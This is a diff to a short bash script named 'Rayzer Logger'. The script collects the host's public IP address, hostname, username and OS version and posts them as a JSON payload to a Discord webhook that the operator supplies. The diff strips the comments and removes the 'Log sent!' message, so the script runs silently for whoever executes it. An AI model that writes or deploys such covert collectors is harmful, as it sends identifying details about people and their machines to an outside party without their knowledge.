@@ -8,18 +8,16 @@ if [ "$WEBHOOK_URL" == "PUT_WEBHOOK_HERE" ]; then
     exit 1
 fi
 
-# Bilgileri Topla
 IP=$(curl -s https://api.ipify.org || echo "Unknown")
 HOSTNAME=$(hostname)
 USER=$(whoami)
 OS=$(uname -sr)
 
-# Discord JSON Payload
 PAYLOAD=$(cat <<EOF
 {
-  "username": "Rayzer Linux Logger",
+  "username": "Rayzer Logger",
   "embeds": [{
-    "title": "New Execution Log (Bash) ⚡",
+    "title": "New Log",
     "color": 3447003,
     "fields": [
       { "name": "IP", "value": "\`$IP\`", "inline": true },
@@ -27,13 +25,11 @@ PAYLOAD=$(cat <<EOF
       { "name": "User", "value": "\`$USER\`", "inline": true },
       { "name": "OS", "value": "\`$OS\`", "inline": false }
     ],
-    "footer": { "text": "Rayzer Execution System" },
+    "footer": { "text": "Rayzer Logger" },
     "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
   }]
 }
 EOF
 )
 
-# Webhook'a Gönder
 curl -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$WEBHOOK_URL"
-echo "Log sent!"
